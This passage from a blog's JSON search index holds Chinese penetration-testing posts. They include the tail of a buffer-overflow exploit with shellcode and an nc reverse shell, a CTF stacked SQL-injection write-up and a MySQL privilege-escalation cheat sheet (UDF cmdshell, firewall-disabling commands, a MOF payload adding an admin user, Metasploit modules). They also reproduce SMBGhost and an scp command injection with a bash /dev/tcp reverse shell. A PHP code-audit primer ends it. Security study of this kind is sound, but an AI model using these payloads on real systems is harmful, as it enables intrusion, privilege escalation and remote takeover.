b\"\\x3c\\x30\\xfa\\x37\\xbc\\x69\\x3e\\x56\\x3e\\x70\\x13\\xb8\\x7f\" buf += b\"\\xbb\\x66\\xb9\\xb8\\xa6\\x8b\\xeb\\x11\\xac\\x3e\\x1b\\x15\\xf8\" buf += b\"\\x82\\x90\\x65\\xec\\x82\\x45\\x3d\\x0f\\xa2\\xd8\\x35\\x56\\x64\" buf += b\"\\xdb\\x9a\\xe2\\x2d\\xc3\\xff\\xcf\\xe4\\x78\\xcb\\xa4\\xf6\\xa8\" buf += b\"\\x05\\x44\\x54\\x95\\xa9\\xb7\\xa4\\xd2\\x0e\\x28\\xd3\\x2a\\x6d\" buf += b\"\\xd5\\xe4\\xe9\\x0f\\x01\\x60\\xe9\\xa8\\xc2\\xd2\\xd5\\x49\\x06\" buf += b\"\\x84\\x9e\\x46\\xe3\\xc2\\xf8\\x4a\\xf2\\x07\\x73\\x76\\x7f\\xa6\" buf += b\"\\x53\\xfe\\x3b\\x8d\\x77\\x5a\\x9f\\xac\\x2e\\x06\\x4e\\xd0\\x30\" buf += b\"\\xe9\\x2f\\x74\\x3b\\x04\\x3b\\x05\\x66\\x41\\x88\\x24\\x98\\x91\" buf += b\"\\x86\\x3f\\xeb\\xa3\\x09\\x94\\x63\\x88\\xc2\\x32\\x74\\xef\\xf8\" buf += b\"\\x83\\xea\\x0e\\x03\\xf4\\x23\\xd5\\x57\\xa4\\x5b\\xfc\\xd7\\x2f\" buf += b\"\\x9b\\x01\\x02\\xff\\xcb\\xad\\xfd\\x40\\xbb\\x0d\\xae\\x28\\xd1\" buf += b\"\\x81\\x91\\x49\\xda\\x4b\\xba\\xe0\\x21\\x1c\\xcf\\xf3\\x2c\\x50\" buf += b\"\\xa7\\xf9\\x2e\\x79\\x58\\x77\\xc8\\x13\\x88\\xd1\\x43\\x8c\\x31\" buf += b\"\\x78\\x1f\\x2d\\xbd\\x56\\x5a\\x6d\\x35\\x55\\x9b\\x20\\xbe\\x10\" buf += b\"\\x8f\\xd5\\x4e\\x6f\\xed\\x70\\x50\\x45\\x99\\x1f\\xc3\\x02\\x59\" buf += b\"\\x69\\xf8\\x9c\\x0e\\x3e\\xce\\xd4\\xda\\xd2\\x69\\x4f\\xf8\\x2e\" buf += b\"\\xef\\xa8\\xb8\\xf4\\xcc\\x37\\x41\\x78\\x68\\x1c\\x51\\x44\\x71\" buf += b\"\\x18\\x05\\x18\\x24\\xf6\\xf3\\xde\\x9e\\xb8\\xad\\x88\\x4d\\x13\" buf += b\"\\x39\\x4c\\xbe\\xa4\\x3f\\x51\\xeb\\x52\\xdf\\xe0\\x42\\x23\\xe0\" buf += b\"\\xcd\\x02\\xa3\\x99\\x33\\xb3\\x4c\\x70\\xf0\\xd3\\xae\\x50\\x0d\" buf += b\"\\x7c\\x77\\x31\\xac\\xe1\\x88\\xec\\xf3\\x1f\\x0b\\x04\\x8c\\xdb\" buf += b\"\\x13\\x6d\\x89\\xa0\\x93\\x9e\\xe3\\xb9\\x71\\xa0\\x50\\xb9\\x53\" s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((host, port)) s.settimeout(2) s.send(\"TRUN /:./\" + 'A'*fuzz + '\\xbb\\x11\\x50\\x62' + '\\x90'*50 + buf) s.recv(1024) print \"Send str length: \" + str(fuzz) 本地对4448端口进行监听 执行exp nc成功获得反弹shell，到此即成功得到交互shell。","categories":[],"tags":[{"name":"复现","slug":"复现","permalink":"https://ms12020.github.io/tags/%E5%A4%8D%E7%8E%B0/"},{"name":"缓冲区溢出","slug":"缓冲区溢出","permalink":"https://ms12020.github.io/tags/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/"}]},{"title":"2019强网杯 随便注","slug":"[强网杯 2019]随便注","date":"2021-04-25T06:29:54.585Z","updated":"2021-04-25T06:31:54.450Z","comments":true,"path":"2021/04/25/[强网杯 2019]随便注/","link":"","permalink":"https://ms12020.github.io/2021/04/25/[%E5%BC%BA%E7%BD%91%E6%9D%AF%202019]%E9%9A%8F%E4%BE%BF%E6%B3%A8/","excerpt":"","text":"[2019 强网杯]随便注访问题目站点，随便输入就能看到返回结果 输入&#39;测试是否存在注入点 发现报错，可以猜测此注入为字符型注入 构造SQL语句返回能查看的所有值 1' or 1=1# 爆出所在表字段数 1' order by 2# //正常回显 1' order by 3# //出现报错 证明有2个字段 尝试爆所在数据库 1' union select database(),user()# 返回了一串代码，说明select函数被过滤 那么select union查询就无法使用了 堆栈注入堆叠注入(堆叠查询，Stacked Queries) 堆叠注入为攻击者提供了很多控制权，与仅限于SELECT语句的UNION联合查询攻击不同，堆叠注入可以用于执行任何SQL语句。 堆叠注入原理在SQL中，分号表示一条语句的结束。如果在分号的后面再加一条语句，这条语句也可以被执行，继续加一个分号和一条语句，这样就可以在一次数据库的调用中执行多个语句。 堆叠注入的局限性堆叠注入并不是在每种情况下都能使用的。大多数时候，因为API或数据库引擎的不支持，堆叠注入都无法实现。 查看所有数据库 -1';show databases;# 查看当前数据库下的所有表 1';show tables;# 查看表结构 -1';desc `1919810931114514`;desc `words`# 在windows系统下，反单引号（`）是数据库、表、索引、列和别名用的引用符 发现flag在1919810931114514表里 判断出查询语句 selsect id,data from words where id = ? payload0';rename table words to words1;rename table `1919810931114514` to words;alter table words change flag id varchar(100) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL;desc words;# 由于可以堆叠查询，这时候就想到了一个改名的方法 把words随便改成words1，然后把1919810931114514改成words，再把列名flag改成id，结合上面的1’ or 1=1#爆出表所有内容就可以查flag啦 1&#39;or 1=1#爆出表所有内容 预处理语句PREPARE name from '[mysql sequece]'; //预定义SQL语句 EXECUTE name; //执行预定义SQL语句 (DEALLOCATE || DROP) PREPARE name; //删除预定义SQL 语句 预定义语句也可以通过变量进行传递 SET @tn = 'hahaha'; //存储表名 SET @sql = concat('select * from ', @tn); //存储SQL语句 PREPARE name from @sql; //预定义SQL语句 EXECUTE name; //执行预定义SQL语句 (DEALLOCATE || DROP) PREPARE sqla; //删除预定义SQL语句 payload利用 char() 函数将select的ASCII码转换为select字符串，接着利用concat()函数进行拼接得到select查询语句，从而绕过过滤。或者直接用concat()函数拼接select来绕过。 不使用变量 1';PREPARE hacker from concat(char(115,101,108,101,99,116), ' * from `1919810931114514` ');EXECUTE hacker;# 使用变量 1';SET @sqli=concat(char(115,101,108,101,99,116),'* from `1919810931114514`');PREPARE hacker from @sqli;EXECUTE hacker;# 只是用contact(),不使用char() 1';PREPARE hacker from concat('s','elect', ' * from `1919810931114514` ');EXECUTE hacker;# 参考文档MySQL中concat函数 Mysql修改字段名、修改字段类型","categories":[],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://ms12020.github.io/tags/CTF/"}]},{"title":"MySQL提权","slug":"MySQL提权","date":"2021-04-11T06:26:42.924Z","updated":"2021-04-11T06:33:00.826Z","comments":true,"path":"2021/04/11/MySQL提权/","link":"","permalink":"https://ms12020.github.io/2021/04/11/MySQL%E6%8F%90%E6%9D%83/","excerpt":"","text":"MySQL提权 流程：服务探针——信息收集——提权利用——获取权限 提权前提：获取数据库最高管理员的账户密码 读取网站数据库配置文件（了解其命名规则及查找技巧） sql、data、inc、config、conn、database、common、include 读取数据库存储或备份文件（了解数据库存储格式及对应内容） @@basedir/data/数据库名/表名.MYD (表内容) 暴力破解（了解数据库是否支持外联及如何开启外联） UDF提权利用root权限，创建带有调用cmd函数的udf.dll(动态链接库)。当我们把udf.dll导出指定文件夹引入MySQL时，其中的调用函数拿出来当作MySQL的函数使用。这样我们自定义的函数才被当作本机函数执行。在使用CREAT FUNCITON调用dll中的函数后，MySQL账号转化为system权限，从而来提权。 MySQL &lt; 5.1 udf.dll文件在Windows2003下放置于c:\\windows\\system32，在windows2000下放置于c:\\winnt\\system32。 MySQL =&gt; 5.1 udf.dll文件必须放置于MYSQL安装目录下的lib\\plugin文件夹下。 查看数据库服务版本信息 select @@version; select version(); 查看数据库安装目录 select @@basedir; select basedir(); 查看MySQL安装路径 show variables like '%plugins%'; 利用NTFS ADS创建lib目录 select 'x' into dumpfile '安装目录\\\\lib::$INDEX_ALLOCATION'; 利用NTFS ADS创建plugin目录 select 'x' into dumpfile '安装目录\\\\lib\\\\plugin::$INDEX_ALLOCATION'; UDF提权文件所在位置 msf的UDF文件原C++函数没有写异常处理，那么MySQL加载的时候会使MySQL出错导致断开连接。 metasploit下的动态链接库 sqlmap下的动态链接库 sqlmap下的4个UDF文件是经过编码的，如果直接丢在MySQL的plugin目录下是无法加载的，需要用sqlmap/extra/cloak/cloak.py进行解码 python .\\cloak.py -d -i ..\\..\\data\\udf\\mysql\\windows\\64\\lib_mysqludf_sys.dll_ -o lib_mysqludf_sys.dll 导出dll到指定目录 可以使用msf中mysql_udf_payload模块 条件： secure_auth=YES (运行导出文件) secure_file_prive=空 (可以导出任意文件到任意位置) 查看是否允许文件导出导入 show variables like \"%secure%\"; 导出dll select 'lib_mysqludf_sys.dll' into outfile '安装目录/lib/pulgin/udf.dll'; 创建cmdshell 函数 (该函数叫什么名字在后续中则使用该函数进行查询) create function cmdshell returns string soname 'udf.dll'; # [AGGREATE]是聚集函数的表示，系统定义的聚集函数比如有COUNT()、AVE()、MN()、MAX()、SUM() # SONAME 'file'表示这个函数从哪个文件里面引入，而这个文件一般是动态链接库，windows下是dll，linux是so，并且这个文件要在mysql的plugin目录下 执行命令 select cmdshell('whoami'); # 关闭windows防火墙和筛选 select cmdshell('net stop policyagent'); select cmdshell('net stop sharedaccess'); select cmdshell('netsh advfirewall set allprofiles state off'); udf.dll下常见函数 cmdshell //执行cmd; downloader //下载者,到网上下载指定文件并保存到指定目录; open3389 //通用开3389终端服务,可指定端口(不改端口无需重启); backshell //反弹Shell; ProcessView //枚举系统进程; KillProcess //终止指定进程; regread //读注册表; regwrite //写注册表; shut //关机,注销,重启; about //说明与帮助函数; MOF提权MOF是windows系统的一个文件（在c:/windows/system32/wbem/mof/nullevt.mof）叫做托管对象格式其作用是每隔五秒就会去监控进程创建和死亡。 其实就是用了MySQL的root权限了以后，然后使用root权限去执行我们上传的MOF。隔了一定时间以后这个MOF就会被执行，这个MOF当中有一段是vbs脚本，这个vbs大多数的是cmd的添加管理员用户的命令。 MOF提权过程: 将MOF上传至任意可读可写目录下 更改MOF文件代码 #pragma namespace(\"\\\\\\\\.\\\\root\\\\subscription\") instance of __EventFilter as $EventFilter &#123; EventNamespace = \"Root\\\\Cimv2\"; Name = \"filtP2\"; Query = \"Select * From __InstanceModificationEvent \" \"Where TargetInstance Isa \\\"Win32_LocalTime\\\" \" \"And TargetInstance.Second = 5\"; QueryLanguage = \"WQL\"; &#125;; instance of ActiveScriptEventConsumer as $Consumer &#123; Name = \"consPCSV2\"; ScriptingEngine = \"JScript\"; ScriptText = \"var WSH = new ActiveXObject(\\\"WScript.Shell\\\")\\nWSH.run(\\\"net.exe user admin admin /add\\\")\"; &#125;; instance of __FilterToConsumerBinding &#123; Consumer = $Consumer; Filter = $EventFilter; &#125;; 使用SQL语句将系统当中默认的nullevt.mof给替换掉 select load_file('D:\\wamp\\xishaonian.mof') into dumpfile 'c:/windows/system32/wbem/mof/nullevt.mof'; MSF进行MOF提权 Msf下的exploit/windows/mysql/mysql_mof模块提供了直接MOF提权，不过该漏洞成功跟操作系统权限和MySQL数据库版本有关，执行成功后会直接反弹shell到meterpreter。 use exploit/windows/mysql/mysql_mof set rhost IP //设置需要提权的远程主机IP地址 set rport 3306 //设置mysql的远程端口 set password root //设置mysql数据库root密码 set username root //设置mysql用户名 show options //查看设置 exploit MySQL允许远程root登入 一: use mysql; update user set host = '%' where user = 'root'; FLUSH PRIVILEGES ; 二: GRANT ALL PRIVILEGES ON . TO 'root'@'%' IDENTIFIED BY 'youpassword' WITH GRANT OPTION; FLUSH PRIVILEGES; 启动项提权 导出自定义可执行文件到启动目录配合重启执行 将创建好的后门或执行文件进行服务器启动项写入,配合重启执行 MSF进行启动项提权 use exploit/windows/mysql/mysql_start_up set rhost IP //设置需要提权的远程主机IP地址 set rport 3306 //设置mysql的远程端口 set password root //设置mysql数据库root密码 set username root //设置mysql用户名 show options //查看设置 exploit Windows下三种MySQL提权剖析 MySQL数据库渗透及漏洞利用总结 mof提权原理及其过程","categories":[],"tags":[{"name":"MySQL","slug":"MySQL","permalink":"https://ms12020.github.io/tags/MySQL/"},{"name":"提权","slug":"提权","permalink":"https://ms12020.github.io/tags/%E6%8F%90%E6%9D%83/"}]},{"title":"CVE-2020-0796（永恒之黑)漏洞复现","slug":"CVE_2020_0796(永恒之黑)漏洞复现","date":"2021-04-10T12:43:29.473Z","updated":"2021-04-11T06:34:10.184Z","comments":true,"path":"2021/04/10/CVE_2020_0796(永恒之黑)漏洞复现/","link":"","permalink":"https://ms12020.github.io/2021/04/10/CVE_2020_0796(%E6%B0%B8%E6%81%92%E4%B9%8B%E9%BB%91)%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/","excerpt":"","text":"CVE-2020-0796（永恒之黑)漏洞原理 SMB远程代码执行漏洞 SMB 3.1.1协议中处理压缩消息时，对其中数据没有经过安全检查，直接使用会引发内存破坏漏洞，可能被攻击者利用远程执行任意代码。攻击者利用该漏洞无需权限即可实现远程代码执行，受黑客攻击的目标系统只需要开机在线就有可能被入侵 Windows 10和Windows Server 2016引入了SMB 3.1.1，本次漏洞源于SMBv3没有正确处理压缩的数据包，在解压数据包的时候使用客户端传过来的长度进行解压时，并没有检查长度是否合法，最终导致整数溢出 利用该漏洞，黑客可直接远程攻击SMB服务端远程执行恶意代码，也可以通过构建恶意SMB服务端诱导客户端连接从而大规模攻击客户端 影响版本Windows 10 Version 1903 for 32-bit Systems Windows 10 Version 1903 for x64-based Systems Windows 10 Version 1903 for ARM64-based Systems Windows Server, Version 1903 (Server Core installation) Windows 10 Version 1909 for 32-bit Systems Windows 10 Version 1909 for x64-based Systems Windows 10 Version 1909 for ARM64-based Systems Windows Server, Version 1909 (Server Core installation) 漏洞复现工具下载 漏洞检测工具：http://dl.qianxin.com/skylar6/CVE-2020-0796-Scanner.zip 攻击poc：https://github.com/eerykitty/CVE-2020-0796-PoC shell脚本：https://github.com/chompie1337/SMBGhost_RCE_PoC 蓝屏复现环境 目标机：Windows 10 1903 ip: 10.7.1.111（虚拟机） 攻击机：Windows 10 20H2 ip: 10.7.6.254（物理机） 将目标机的防火墙关闭 在攻击机上对目标机进行检测，看其是否存在漏洞。 利用下载的poc脚本发起攻击 反弹shell环境 目标机：Windows 10 1903 ip: 10.7.1.111（虚拟机） 攻击机：Windows 10 20H2 ip: 10.7.6.254（物理机） 生成一个反弹木马 msfvenom -p windows/x64/meterpreter/bind_tcp LPORT=8888 -b '\\x00' -i 1 -f python 说明: #-p payload #-e 编码方式 #-i 编码次数 #-b 过滤坏字符 #LHOST,LPORT 监听上线的主机IP和端口 #-f python 生成python格式 #‘\\x00‘转义字符，对应ascall码中为null，因为是二进制文件所以会出现，在python中作为结束的标志，有点相当于%00截断的感觉。 用生成的shellcode将shell脚本工具里面的exploit.py中的user_payload替换掉。保留前面的名字，只替换内容 开启msf监听模块 运行exploit.py脚本，发起攻击反弹shell 这个脚本有点问题，要多试几次才能得到shell，不用着急。这个脚本有时候会把靶机打蓝屏，重启一下靶机就好了，继续执行脚本知道得到shell。","categories":[],"tags":[{"name":"复现","slug":"复现","permalink":"https://ms12020.github.io/tags/%E5%A4%8D%E7%8E%B0/"},{"name":"Windows 10","slug":"Windows-10","permalink":"https://ms12020.github.io/tags/Windows-10/"},{"name":"SMB","slug":"SMB","permalink":"https://ms12020.github.io/tags/SMB/"}]},{"title":"CVE-2020-15778 OpenSSL漏洞复现","slug":"CVE-2020-15778(OpenSSL)漏洞复现","date":"2021-04-10T12:40:24.207Z","updated":"2021-04-11T06:33:29.417Z","comments":true,"path":"2021/04/10/CVE-2020-15778(OpenSSL)漏洞复现/","link":"","permalink":"https://ms12020.github.io/2021/04/10/CVE-2020-15778(OpenSSL)%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/","excerpt":"","text":"CVE-2020-15778 OpenSSL影响版本： OpenSSH &lt;= 8.3p1 漏洞介绍 漏洞公开披露2020年7月18日，openssh 8.3p1的SCP命令存在命令注入漏洞，攻击者可以利用此漏洞执行任意命令。 局限性 适用范围小，需要知道root用户密码，最大最用为ssh无法连接，但scp可以使用时 环境搭建 使用iptables策略搭建环境，禁用ssh登录，只保留scp(CentOS) 关闭自带防火墙(firewalld) 停止firewalld服务 $ systemctl stop firewalld 设置iptables策略 service iptables start iptables -t filter -A INPUT -p tcp --dport 22 -m tos --tos 0x10 -j DROP service iptables save iptables -L -n --line-number 验证 scp功能正常使用，但是ssh在输入密码后，无任何回响，无法连接，证明iptables策略成功有效。 漏洞复现在kali里面新建1.sh，写入反弹shell的bash命令 bash -i >& /dev/tcp/10.7.5.120>&1 kali监听6666端口 使用scp命令传输文件到CentOS的/tmp目录 命令执行，运行1.sh scp 1.sh root@192.168.1.135:/'`sh /tmp/1.sh`' 漏洞分析 scp命令源码 if (remin == -1) &#123; xasprintf(&bp, \"%s -t %s%s\", cmd, *targ == '-' ? \"-- \" : \"\", targ); if (do_cmd(thost, tuser, tport, bp, &remin, &remout) < 0) exit(1); if (response() < 0) exit(1); free(bp); &#125; 当执行本地scp命令时，scp不会检查、过滤和清除文件名。这使得攻击者执行带有反引号的有效scp命令时，本地shell还将执行反引号中的命令。 修复建议补丁/升级","categories":[],"tags":[{"name":"OpenSSL","slug":"OpenSSL","permalink":"https://ms12020.github.io/tags/OpenSSL/"},{"name":"复现","slug":"复现","permalink":"https://ms12020.github.io/tags/%E5%A4%8D%E7%8E%B0/"}]},{"title":"PHP代码审计基础概念","slug":"代码审计概述","date":"2021-04-10T08:42:14.704Z","updated":"2021-04-11T06:32:36.874Z","comments":true,"path":"2021/04/10/代码审计概述/","link":"","permalink":"https://ms12020.github.io/2021/04/10/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%A6%82%E8%BF%B0/","excerpt":"","text":"PHP代码审计工具代码编辑器 Notepad++ Visual Studio Code 代码审计工具 Seay源代码审计系统 Firtufy SCA RIPS 漏洞验证辅助 BurpSuite Community 浏览器扩展 编码转换、加密解密工具 正则调试工具 SQL执行监控工具 思路 检查铭感函数的参数，然后回溯变量，判断变量是否可控并且没有经过严格的过滤（逆向追踪） 找出哪些文件在接收外部传入的参数，然后跟踪变量的传递过程，观察是否有变量传入到高危函数中，或者传递的过程中是否有代码逻辑漏洞（正向追踪） 直接挖掘功能点漏洞，根据自身的禁言判断该类应用通常在哪些功能中会出现漏洞，直接全篇阅读该功能代码 学好代码审计需要掌握一下几点 PHP编程语言的特性和基础 Web前端编程基础 漏洞形成原理 代码审计思路 不同系统、中间件之间的特性差异 PHP核心配置​ 常见PHP_INI_*常量的定义 常量 含义 PHP_INI_USER 该配置选项可在用户的PHP脚本或Windows注册表中设置 PHP_INI_PERDIR 该配置选项可在php.ini、.htaccess或httpd.conf中设置 PHP_INI_SYSTEM 该配置选项可在php.ini或httpd.conf中配置 PHP_INI_ALL 该配置选项可在任何地方设置 php.ini.only 该配置选项可仅可在php.ini中配置 常见核心配置register_globals(全局变量注册开关) 版本：&lt;= PHP 5.3.0 在选项设置为on的情况下，会直接吧用户GET、POST等方式提交上来的参数注册成全局变量并初始化值为参数对应的值，使得提交的参数可以直接在脚本中使用 allow_url_include(是否允许包含远程文件) 版本：PHP all PHP 5.2.0之后默认为Off 类似函数：allow_url_fopen(是否打开远程文件) 在该配置为on的情况下，它可以直接远程包含文件，当存在include($var)并且$var可控的情况下，可以直接控制其来执行PHP代码 magic_quotes_gpc(魔术引号自动过滤) 版本：&lt; PHP 5.4； PHP 5.3之后不推荐使用该函数 置返回： &lt; PHP 4.2.3配置范围为PHP_INI_ALL；&gt; PHP 4.2.3配置范围为PHP_INI_PERDIR 当选项为On时，在不存在编码或者其他绕过绕过的情况下，可以使得很多漏洞无法利用，他会自动在GET、POST、COOKIE变量中的单引号&#39;&#39;、双引号&quot;&quot;、反斜杠\\以及空字符NULL的前面加上反斜杠 在PHP5中magic_quotes_gpc不会过滤$_SERVER变量，导致很多client-ip、referer一类的漏洞能够利用。 open_basedir(PHP可访问目录) 版本：PHP ALL 范围：&lt; PHP 5.2.3配置范围为PHP_INI_SYSTEM；&gt; PHP 5.2.3配置范围PHP_INI_ALL open_basedir指令用来限制PHP只能访问哪些目录，通常只需要设置Web文件目录即可，如果需要加载其他外部脚本，也需要吧脚本所在的目录路径加入到open_basedir指令中，多个目录用分号(;)分隔 # `open_basedir`指定的实际上时前缀，而不是目录名 open_basedir=/www/a # 设定可访问的目录为/www下以a开头的文件，也就是说/www/a和/www/ab都可以被访问 open_basedir=/www/a/ # 设置只能访问/www/a文件 当open_basedir配置目录后，执行脚本访问其他函数都需要验证文件是否符合配置要求，因此会影响效率 disable_functions(禁用函数) 版本：PHP ALL 范围：该指令的配置范围为php.ini only 在正式生产环境中，为了更安全地允许PHP，也可以使用disable_functions指令来禁止一些敏感函数的使用。当你使用该指令禁用危险函数时，切记将dl()函数加到禁止列表中，因为攻击者可以利用dl()函数来加载自定义的PHP扩展以突破disable_functions的限定 # 多个函数之间用逗号（,）分隔 disable_functions=phpinfo,eval,passthru,exec,system,dl disable_errors和error_reporting(错误显示) 版本：PHP ALL 配置范围：PHP_INI_ALL disable_errors表明是否显示PHP脚本内部的错误，在调试时通常将PHP错误显示打开，但是在生产环境中，建议关闭PHP错误回显。 为了避免一些安全隐患，在设置disable_errors=On时，还可以配置error_reporting，这个选项用来配置错误显示的级别，可使用数字也可使用内置常量配置。 ​ 数字格式与变量格式的详细信息 ​ 常用指令及说明","categories":[],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://ms12020.github.io/tags/PHP/"},{"name":"代码审计","slug":"代码审计","permalink":"https://ms12020.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"}]}],"categories":[],"tags":[{"name":"复现","slug":"复现","permalink":"https://ms12020.github.io/tags/%E5%A4%8D%E7%8E%B0/"},{"name":"LNK","slug":"LNK","permalink":"https://ms12020.github.io/tags/LNK/"},{"name":"缓冲区溢出","slug":"缓冲区溢出","permalink":"https://ms12020.github.io/tags/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/"},{"name":"CTF","slug":"CTF","permalink":"https://ms12020.github.io/tags/CTF/"},{"name":"MySQL","slug":"MySQL","permalink":"https://ms12020.github.io/tags/MySQL/"},{"name":"提权","slug":"提权","permalink":"https://ms12020.github.io/tags/%E6%8F%90%E6%9D%83/"},{"name":"Windows 10","slug":"Windows-10","permalink":"https://ms12020.github.io/tags/Windows-10/"},{"name":"SMB","slug":"SMB","permalink":"https://ms12020.github.io/tags/SMB/"},{"name":"OpenSSL","slug":"OpenSSL","permalink":"https://ms12020.github.io/tags/OpenSSL/"},{"name":"PHP","slug":"PHP","permalink":"https://ms12020.github.io/tags/PHP/"},{"name":"代码审计","slug":"代码审计","permalink":"https://ms12020.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"}]}